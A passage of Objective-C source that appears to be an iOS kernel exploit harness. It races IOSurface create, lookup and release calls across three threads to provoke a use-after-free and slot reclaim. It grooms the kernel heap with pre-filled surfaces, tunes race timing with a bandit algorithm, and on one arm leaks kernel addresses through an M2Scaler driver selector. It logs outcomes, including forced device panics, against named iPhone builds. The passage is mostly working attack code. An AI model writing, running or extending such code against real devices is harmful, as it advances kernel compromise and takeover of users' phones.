    /* v1.1: the SESSION counters reset at tap start (the 12:06-round bug:
       113 accumulated counts printed under the session shape); the _proc
       counters below keep accumulating for the process-totals line. */
    atomic_store(&v_win_lost, 0);
    atomic_store(&v_family_b, 0);
    atomic_store(&v_claim_won, 0);
    atomic_store(&v_aborted, 0);

    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:@"p110_swapclaim_log.txt"] UTF8String],
                O_CREAT | O_WRONLY | O_TRUNC, 0644);

    /* session banner law */
    Lf(@"=== p110 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P110_BUILD);

    /* Ident ALWAYS prints (SKU law: run on BOTH iPhone13,2/23F77 + iPhone18,2/24A435) */
    L([LabDeviceProfile identBlock]);

    L(p110_flags_law());
    L(@"[claim law] detach-then-set vs destroy twin both act on [surface+0x30] unlocked: "
      @"release old client (vtbl+0xe0) -> set (PAC setter, autda 0xcda1|objaddr) -> vt+0x48 "
      @"consumer (++[p+0xc], ++[p+0x10], [this+flags]|=0x1c). Auth-passing reclaim = genuine "
      @"IOSurface-class object ONLY; attacker content = autda poison far 0x0020000000000048 "
      @"= Family-B window-won/slot-lost.");
    L(@"[session shape v1] the dlsym framework law drives ONE IOSurface root session per "
      @"process. The sibling-session raw-sel arm (IOServiceOpen IOSurfaceRoot + row-0 "
      @"create-attach) stays HOLD: the row sin/col sizes are not pinned in the intel rows, "
      @"and guessed struct sizes are not fired (no-guess law). The pop law prefill(6)+2 runs "
      @"against the kext zalloc/kalloc-type client sites via the framework create path.");
    L(@"[influence law] WHICH sibling session + WHEN its owner dies — never a raw user word "
      @"inside [surface+0x30].");
    Lf(@"[bounds] %d rounds max, one tap per force-quit law, fsync per line, all race rounds "
       @"marked IN FLIGHT before arming (post-panic outcome-(b) attribution).",
       P110_ROUNDS);

    /* ---- v1.2 bandit: shared ledger + dirty-boot attribution + one pick
       per tap (Documents/lab_bandit.json). The pick lands after the SKU
       gate + dlsym below, so the knobs apply to every raced round. -------- */
    {
        char attr[256];
        int a = LabBanditRegister("p110", g_p110_arms, 6, g_p110_seeds, 1,
            "p110 claim-oracle v1/v1.1 rounds (approximate, honestly labeled): "
            "the 12:06-round ledger note — 113 accumulated process-lifetime "
            "window counts under the v1 shape; the other arms seed at zero",
            /* boot change on an open round = device panic on the IN FLIGHT
               line = design outcome (b), the attested Family-B class        */
            "family-b",
            /* same boot = the in-process SIGBUS/EFAULT-class (b) catch killed
               the process (the only unclosed exit; a force-quit looks the
               same — the log's handler line names the round)               */
            "family-b",
            attr, sizeof attr);
        if (a == 1 || a == 2)
            Lf(@"[bandit] %@", [NSString stringWithUTF8String:attr]);
        else if (a < 0)
            Lf(@"[bandit] shared ledger load FAILED — this round may not "
               @"attribute after a panic");
    }

    /* SKU gate: HOLD prints ident and returns; both target SKUs run */
    LabSku sku = [LabDeviceProfile detectedSku];
    if (sku != LabSkuA14_23F77 && sku != LabSkuT8150_24A435) {
        L(@"[-] HOLD: this SKU/build has no 112477 lane row — ident printed, nothing raced.");
        LabBanditRoundClose("p110", NULL);   /* nothing raced: no arm outcome */
        if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
        return g_log;
    }
    if (sku == LabSkuT8150_24A435) {
        L(@"[24A435 honesty] the 27.0 detacher twin + flags +0x3d0 law are byte-verified; "
          @"the vtB/vtC twin vtables + consumer body are NOT pinned yet (intel row OWE). "
          @"T8150 verdicts are behavioral-only until that scan lands.");
    }

    /* ---- dlsym the framework surface (no iOSurface.h import) ---- */
    void *ios = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) ios = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!ios) {
        L(@"[-] IOSurface framework dlopen failed — probe stopped, nothing raced");
        LabBanditRoundClose("p110", NULL);
        if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
        return g_log;
    }
    g_create = (IOSurfaceCreate_t)dlsym(ios, "IOSurfaceCreate");
    g_lookup = (IOSurfaceLookup_t)dlsym(ios, "IOSurfaceLookup");
    g_getid  = (IOSurfaceGetID_t)dlsym(ios, "IOSurfaceGetID");
    g_base   = (IOSurfaceGetBaseAddress_t)dlsym(ios, "IOSurfaceGetBaseAddress");
    g_alloc  = (IOSurfaceGetAllocSize_t)dlsym(ios, "IOSurfaceGetAllocSize");
    void *rel = dlsym(ios, "IOSurfaceRelease");
    if (rel) {
        g_release = (void (*)(IOSurfaceRef))rel;
        L(@"[dlsym] IOSurfaceCreate/GetID/Lookup/GetBaseAddress/GetAllocSize/IOSurfaceRelease present");
    } else {
        g_release = (void (*)(IOSurfaceRef))CFRelease;
        L(@"[dlsym] IOSurfaceRelease absent — CFRelease fallback (CFType refcount on the ref)");
    }
    if (!g_create || !g_getid || !g_lookup) {
        L(@"[-] required dlsyms absent (Create/GetID/Lookup) — probe stopped, nothing raced");
        LabBanditRoundClose("p110", NULL);
        if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
        return g_log;
    }

    /* ---- v1.2 bandit PICK (one arm per tap; the rounds inside this tap
       share it). Existing code paths only — see g_p110_arms above. -------- */
    {
        char pickLine[160];
        g_p110_arm = LabBanditPick("p110", pickLine, sizeof pickLine);
        p110_arm_apply();
        Lf(@"[bandit] %@", [NSString stringWithUTF8String:pickLine]);
        char sc[512];
        if (LabBanditScores("p110", sc, sizeof sc) >= 0)
            Lf(@"[bandit] UCB1 %s", sc);
        Lf(@"[bandit] arm=%s -> prefill=%d dial=%s pop=%s leakgate=%s "
           @"(Documents/lab_bandit.json)",
           LabBanditArmName("p110", g_p110_arm), g_p110_prefillN,
           g_p110_dialBase0 ? "pinned-0ns" : "+200ns-bump-law",
           g_p110_popEarly ? "EARLY-pre-window" : "in-window",
           g_p110_leakStage ? "ON (sel-8 leak stage + pairing)" : "OFF (pure v1.2)");
    }

    /* ---- v2 LEAK STAGE validation capture (leakgate-on arm only) ----
       One sel-8 capture with the FULL KV table print = the leak law's own
       law print. Shape mismatch (kext version drift) = hexdump + HOLD the
       pairing (tolerant law); the race rounds continue unpaired either way.
       The M2Scaler door is never closed on this tap (P027/P098 delayed-
       teardown law). ----------------------------------------------- */
    if (g_p110_leakStage) {
        L(@"[leak law] M2ScalerCSCDriver sel-8 (iosaDiag): in = {u64} 8 BYTES "
          @"(row sin=8; NOT p098's 16-byte {va,size} — the v5 run-failer); out = "
          @"the activity-queue serializer records: +0x20 header, stride 0x7c, "
          @"rec+0x18 = RAW first-event qword passthrough (no auth) = the leak "
          @"of the IOSurface KVA class (m2scaler.get_iosaDiag_sel intel row; "
          @"likely CVE-2026-64709, fixed 26.6/23G71). rec+0x30 = the +0x30-class "
          @"client-ptr field (t8150.m2scaler.client30 law) = the claim law's own "
          @"[surface+0x30] shape — the pairing observable.");
        g_p110_leak_ok = p110_leak_capture(@"validate", YES, &g_p110_snap_pre);
        if (g_p110_leak_ok)
            L(@"[leak] law shape CONFIRMED — pairing ARMED for the claim windows "
              @"(per-round pre/post snapshots; claim-won prints the leak DIFF)");
        else
            L(@"[leak] pairing HELD (tolerant law) — race rounds continue UNPAIRED; "
              @"no pairing observable will print on claim-won rounds");
    } else {
        L(@"[leak] leakgate-off arm: pure v1.2 — no leak stage, no pairing "
          @"(the bandit's control side for the leak-rate question)");
    }

    /* (b) userspace alias-path fault catcher */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = p110_sigfault;
    sa.sa_flags = SA_SIGINFO;
    (void)sigaction(SIGBUS,  &sa, NULL);
    (void)sigaction(SIGSEGV, &sa, NULL);
    (void)sigaction(SIGFPE,  &sa, NULL);

    g_run = true;
    pthread_t te, td, tp;
    (void)pthread_create(&te, NULL, p110_t_engine,  NULL);
    (void)pthread_create(&td, NULL, p110_t_destroy, NULL);
    (void)pthread_create(&tp, NULL, p110_t_reclaim, NULL);

    /* ---- prefill(<bandit>) : pre-created LIVE sibling-client objects ---- */
    IOSurfaceRef prefill[P110_PREFILL_MAX];
    uint32_t prefill_sid[P110_PREFILL_MAX];
    int prefill_n = 0;
    for (int i = 0; i < g_p110_prefillN; i++) {
        prefill[i] = p110_create(&prefill_sid[i]);
        if (prefill[i]) {
            prefill_n++;
            if (g_base) {
                volatile uint8_t *b = (volatile uint8_t *)g_base(prefill[i]);
                if (b) b[0] = (uint8_t)(P110_MARKER + i);
            }
            Lf(@"[prefill %d/%d] sid=%08x alive (claim-candidate class, kext zalloc/kalloc-type site)",
               i + 1, g_p110_prefillN, prefill_sid[i]);
        } else {
            Lf(@"[prefill %d/%d] create FAILED — honest, bounded count adjusted", i + 1, g_p110_prefillN);
        }
    }
    Lf(@"[*] prefill(%d) done: %d/%d live claim candidates; +2 fresh creates per round "
       @"(%s pop law, affinity tag 1 = one magazine)",
       g_p110_prefillN, prefill_n, g_p110_prefillN,
       g_p110_popEarly ? "EARLY-pre-window bandit arm" : "in-window");

    /* ---- the 64-round D-thread cycle ---- */
    long dial = 0;              /* 267 v10 dial: bump one slot per window-lost round */
    uint32_t prev_sid = 0;
    IOSurfaceRef prev_sib = NULL;   /* prior round's sibling ref (kept for the alias check) */

    for (int r = 1; r <= P110_ROUNDS && g_run; r++) {
        g_round = r;
        g_st_e = g_st_d = g_st_p = TST_NONE;
        g_e_target = NULL;
        g_d_target = NULL;
        g_d_probe_alive = -1;
        for (int i = 0; i < P110_POP; i++) { g_pop[i] = NULL; g_pop_sid[i] = 0; }

        /* the round surface is created OUTSIDE the window — its attach is
           already settled; the race is the OWNER-death release vs the +2 pop */
        uint32_t sid = 0;
        IOSurfaceRef s = p110_create(&sid);

        /* sibling law: map the surface through a second held reference —
           the per-session client object lives in the same kalloc-type zones
           (v1 = same framework session, disclosed in the banner)           */
        IOSurfaceRef sib = (sid && g_lookup) ? g_lookup(sid) : NULL;

        uint32_t marker = 0;
        if (sib && g_base) {
            volatile uint8_t *b = (volatile uint8_t *)g_base(sib);
            if (b) {
                b[1] = (uint8_t)(P110_MARKER ^ (uint8_t)r);
                marker = b[1];
            }
        }

        if (!s || !sid) {
            Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — create failed, nothing raced; "
               @"dial stays %ldns", r, P110_ROUNDS, dial);
            atomic_fetch_add(&v_win_lost, 1); atomic_fetch_add(&v_win_lost_proc, 1);
            LabBanditRecord("p110", g_p110_arm, "window-lost");
            if (sib) { p110_release(sib); sib = NULL; }
            continue;
        }

        Lf(@"[r %d/%d] sid=%08x alloc=%lld attach settled (outside window)",
           r, P110_ROUNDS, sid, g_alloc ? (long long)g_alloc(s) : -1);

        /* v2 leak stage, pre-round: the pre-window leak snapshot — its record
           count rides the IN FLIGHT stamp below as the round's pre-window
           state (law: the leak stage runs BEFORE the window arms). */
        if (g_p110_leakgate && g_p110_leak_ok)
            (void)p110_leak_capture([NSString stringWithFormat:@"pre-r%d", r],
                                    NO, &g_p110_snap_pre);

        /* in-flight marker: fsync'd BEFORE arming. If the device reboots on
           this line, the outcome was (b) = window WON, free slot (the
           attested Family-B class). Honest print, no success claim.
           v2: the stamp carries the leak-record count as the round's
           pre-window state (0 = no leak stage / pairing HELD).             */
        Lf(@"[r %d/%d] IN FLIGHT — D: owner-release sid=%08x (destroy-twin class) / "
           @"E: owner-release the round surface (detacher half) / P: pop(%d+2, %s) "
           @"dial %ldns, same CPU — leak-recs=%d (%s). If the device reboots here: "
           @"outcome (b), Family-B far 0x0020000000000048 = window WON, free slot "
           @"(attested class).",
           r, P110_ROUNDS, sid, g_p110_prefillN,
           g_p110_popEarly ? "EARLY-pre-window" : "in-window", dial,
           (g_p110_leakgate && g_p110_leak_ok) ? g_p110_leak_recs : 0,
           (g_p110_leakgate && g_p110_leak_ok)
               ? @"pre-window sel-8 snapshot" : @"no leak stage / pairing HELD");

        /* bandit arm 3 (popearly): the SAME +2 fresh creates issued EARLY,
           pre-window — the pop-timing calibration arm; everything else in
           the round is unchanged (the reclaim thread stays idle in-window). */
        if (g_p110_popEarly) {
            for (int i = 0; i < P110_POP; i++) {
                uint32_t psid = 0;
                g_pop[i] = p110_create(&psid);
                g_pop_sid[i] = psid;
            }
            Lf(@"[r %d/%d] pop EARLY (pre-window): the +2 fresh creates issued "
               @"before the gate (bandit pop-timing calibration arm)",
               r, P110_ROUNDS);
        }

        /* arm the racers */
        g_e_target = s;              /* T_engine drops the round A-ref        */
        g_d_target = prev_sib;       /* T_destroy drops the prior sibling ref
                                        = owner death for the round n-1 victim */
        g_d_sid    = prev_sid;
        g_dial     = dial;

        /* bounded park wait: every racer back at idle before the gate —
           closes the miss-the-gate race (a stuck racer deadlocks a round,
           so an armed window waits for parked threads only, never guesses) */
        int parked = 0;
        while (g_run && parked < P110_GO_TIMEOUT_MS &&
               !(g_park_e && g_park_d && g_park_p)) {
            usleep(1000);
            parked++;
        }
        if (!(g_park_e && g_park_d && g_park_p)) {
            atomic_fetch_add(&v_aborted, 1); atomic_fetch_add(&v_aborted_proc, 1);
            Lf(@"[r %d/%d] ABORTED ROUND (honest): racers never re-parked "
               @"(E-park=%d D-park=%d P-park=%d) — bounded stop, no retry storm",
               r, P110_ROUNDS, g_park_e, g_park_d, g_park_p);
            LabBanditRecord("p110", g_p110_arm, "abort");
            g_run = false;
            break;
        }

        __sync_synchronize();
        g_gate = 1;                                   /* GO                   */
        int waited = 0;
        while (g_run && waited < P110_GO_TIMEOUT_MS &&
               (!g_st_e || !g_st_d || !g_st_p)) {
            usleep(1000);
            waited++;
        }
        g_gate = 0;
        __sync_synchronize();
        /* bounded unwind: racers park on !g_gate before the next round    */
        int unwound = 0;
        while (g_run && unwound < P110_GO_TIMEOUT_MS &&
               (g_st_e != TST_DONE || g_st_d != TST_DONE || g_st_p != TST_DONE)) {
            usleep(1000);
            unwound++;
        }
        if (!g_st_e || !g_st_d || !g_st_p) {
            atomic_fetch_add(&v_aborted, 1); atomic_fetch_add(&v_aborted_proc, 1);
            Lf(@"[r %d/%d] ABORTED ROUND (honest): racer(s) missed the window "
               @"(E=%d D=%d P=%d) — bounded stop, no retry storm",
               r, P110_ROUNDS, g_st_e, g_st_d, g_st_p);
            LabBanditRecord("p110", g_p110_arm, "abort");
            g_run = false;
            break;
        }

        Lf(@"[r %d/%d] returns (honest): engine-drop=%s destroy-kr-path=%s "
           @"post-ownership-sid=%s pop=[%08x %08x] (zalloc probe law)",
           r, P110_ROUNDS,
           (g_e_target == NULL) ? @"consumed" : @"missed",
           (g_d_target == NULL) ? @"consumed" : @"missed",
           (g_d_probe_alive == 0) ? @"freed"
         : (g_d_probe_alive > 0) ? @"RESOLVABLE after owner release"
                                 : @"n/a (no prior victim this round)",
           g_pop_sid[0], g_pop_sid[1]);

        /* ---- post-round evidence pass (design §4 per-round print law) ---- */
        NSString *evidence = nil;
        int anomalies = 0;

        /* 1. alias-path divergence: the round surface's A-ref was dropped
              IN WINDOW (T_engine) while this sibling ref still holds the
              object — the mapping must still answer and still carry the
              pre-window marker byte; divergence = alias-path evidence     */
        if (sib && g_base) {
            volatile uint8_t *b = (volatile uint8_t *)g_base(sib);
            if (b) {
                uint8_t now = b[1];
                if (marker && now != marker) {
                    evidence = [NSString stringWithFormat:
                        @"alias-path VALUE DIVERGENCE through the sibling mapping "
                        @"(marker %02x -> %02x after the owner release)",
                        marker, now];
                    anomalies++;
                }
            }
        }

        /* 2. owner-death resolution: a fully released sid must not resolve */
        if (g_d_probe_alive == 1) {
            evidence = evidence ? [evidence stringByAppendingString:
                @"; post-ownership sid still resolvable (release did not conclude)"]
                                : @"post-ownership sid still resolvable";
            anomalies++;
        }

        /* 3. slot-claim shape: a +2 pop's sid colliding with the victim sid
              = kernel object law +0x10 id reissued on the zalloc slot      */
        for (int i = 0; i < P110_POP; i++) {
            if (g_pop_sid[i] && prev_sid && g_pop_sid[i] == prev_sid) {
                evidence = evidence ? [evidence stringByAppendingFormat:
                    @"; pop[%d] sid=%08x == victim sid (zalloc slot-reuse shape)",
                    i, g_pop_sid[i]] :
                    [NSString stringWithFormat:
                    @"pop[%d] sid=%08x == victim sid (zalloc slot-reuse shape)",
                    i, g_pop_sid[i]];
                anomalies++;
            }
        }

        /* 4. flag-law honesty: [this+flags]|=0x1c is kernel-side; no
              userspace read of that field exists in this lane. Evidence
              stays proxy-class until a kread lane pairs this door.         */
        if (anomalies) {
            atomic_fetch_add(&v_claim_won, 1); atomic_fetch_add(&v_claim_won_proc, 1);
            Lf(@"[r %d/%d] OUTCOME (c) CLAIM-WON-CANDIDATE (proxy-class evidence, no "
               @"success claim): %@", r, P110_ROUNDS, evidence);
            LabBanditRecord("p110", g_p110_arm, "claim-won");
            dial = 0;             /* a won window resets the dial (267 v10 law) */
            /* v2 PAIR OBSERVABLE: claim-won -> the claim-window leak DIFF.
               The post-window snapshot is taken NOW, after the window closed;
               the +0x30-class KV changes = the claim-corruption observable
               (proxy-class: names the objects, proves the corruption CLASS;
               no kread claim — the LAW label is printed by the diff itself). */
            if (g_p110_leakgate && g_p110_leak_ok &&
                p110_leak_capture([NSString stringWithFormat:@"post-r%d", r],
                                  NO, &g_p110_snap_post)) {
                p110_leak_diff(r);
                g_p110_leak_pairs++;
            }
        } else {
            atomic_fetch_add(&v_win_lost, 1); atomic_fetch_add(&v_win_lost_proc, 1);
            if (g_p110_dialBase0) {
                /* bandit arm 0/3: dial cadence base 0ns — the calibration
                   spin stays pinned at zero (no bump path) */
                dial = 0;
                Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — clean round, no anomaly; "
                   @"dial pinned 0ns (bandit dial-base-0 arm)", r, P110_ROUNDS);
            } else {
                long nd = dial ? dial * 2 : 200;
                if (nd > P110_DIAL_MAX) nd = P110_DIAL_MAX;
                dial = nd;
                Lf(@"[r %d/%d] OUTCOME (a) WINDOW LOST (honest) — clean round, no anomaly; "
                   @"dial one slot -> %ldns", r, P110_ROUNDS, dial);
            }
            LabBanditRecord("p110", g_p110_arm, "window-lost");
        }

        /* round teardown (bounded; magazine law stays reproducible)        */
        for (int i = 0; i < P110_POP; i++) {
            if (g_pop[i]) { p110_release(g_pop[i]); g_pop[i] = NULL; }
        }
        /* the round surface rides into the NEXT round as the victim:       */
        /*   - the round A-ref 's' was consumed by T_engine in-window;      */
        /*   - 'sib' (kept alive as prev_sib) is the owner ref T_destroy    */
        /*     will release next round = the owner-death event, per law.    */
        if (prev_sib) { /* already released by T_destroy this round's window  */
            prev_sib = NULL;    /* framework ref consumed — do not re-release */
        }
        prev_sib = sib;
        prev_sid = sid;
    }

    g_run = false;
    (void)pthread_join(te, NULL);
    (void)pthread_join(td, NULL);
    (void)pthread_join(tp, NULL);

    /* end-state honesty: drop every prefill candidate */
    for (int i = 0; i < P110_PREFILL_MAX; i++) {
        if (prefill[i]) { p110_release(prefill[i]); prefill[i] = NULL; }
    }
    if (prev_sib) { p110_release(prev_sib); prev_sib = NULL; }

    int wl = atomic_load(&v_win_lost);
    int fb = atomic_load(&v_family_b);
    int cw = atomic_load(&v_claim_won);
    int ab = atomic_load(&v_aborted);
    /* v1.1: two verdict lines — THIS tap vs the process lifetime (the 12:06
       round bug printed the accumulated process numbers as session totals). */
    Lf(@"=== VERDICT (honest) === rounds requested=%d", P110_ROUNDS);
    Lf(@"[v1.1] session totals: window-lost=%d claim-won-candidates=%d "
       @"family-b-in-process=%d aborted=%d", wl, cw, fb, ab);
    Lf(@"[v1.1] process totals: window-lost=%d claim-won-candidates=%d "
       @"family-b-in-process=%d aborted=%d (every tap this process, not reset)",
       atomic_load(&v_win_lost_proc), atomic_load(&v_claim_won_proc),
       atomic_load(&v_family_b_proc), atomic_load(&v_aborted_proc));
    Lf(@"[v2 leak-gate] arm=%s: sel-8 captures=%d claim-window DIFFs=%d pairing=%s "
       @"(M2ScalerCSC door left OPEN this tap — P027/P098 delayed-teardown law; one "
       @"tap per force-quit)",
       LabBanditArmName("p110", g_p110_arm), g_p110_leak_caps, g_p110_leak_pairs,
       g_p110_leakgate ? (g_p110_leak_ok ? @"ARMED" : @"HELD (hexdump recorded)") : @"off");
    L(@"  (a) clean-no-anomaly      = window lost (honest print; dial bumped one slot per round)");
    L(@"  (b) Family-B-shaped fault = window WON, free slot. Two shapes: an in-process "
      @"SIGBUS/EFAULT-class catch on the alias path (printed above), or the device panic on "
      @"an IN FLIGHT line (the fsync'd log names the round after reboot). Neither is a "
      @"success claim — (b) is the timing proof per note 270 §3.");
    L(@"  (c) claim won             = silent clean + proxy-class evidence (alias-path "
      @"divergence / zalloc slot-reuse sid law / post-ownership resolvable sid). "
      @"DETECTOR is proxy-class: the kernel [obj+flags]|=0x1c field is not user-readable "
      @"from this lane — the flag readback stays proxy-honest until a kread lane pairs "
      @"this door (note-152 m2scaler = the pairing candidate on 23F77).");
    L(@"HONESTY: kread=NO kwrite=NO hasKread=NO. Verdict = claim-oracle + refcount/flag "
      @"corruption CLASS evidence; no success claim is made without flags/alias evidence. "
      @"v2: every leaked KV printed is LAW: KVA DISCLOSURE CLASS — not kread (the sel-8 "
      @"event_payload passthrough); hasKread=NO stays until a kread32-class receipt "
      @"exists. The (b) catch stays the sigaction law.");

    /* v1.2 bandit: close the open round (per-round outcomes recorded above;
       the summary is the session's dominant shape — a panic or the in-process
       (b) catch instead leaves the round open for the shared dirty-boot
       attribution law). */
    LabBanditRoundClose("p110", ab ? "abort" : (cw ? "claim-won" : "window-lost"));
    Lf(@"[bandit] round closed: arm=%s outcomes this session: window-lost=%d "
       @"claim-won=%d aborted=%d (Documents/lab_bandit.json)",
       LabBanditArmName("p110", g_p110_arm), wl, cw, ab);

    if (g_fd >= 0) { (void)fcntl(g_fd, F_FULLFSYNC); (void)close(g_fd); g_fd = -1; }
    return g_log;
}

@end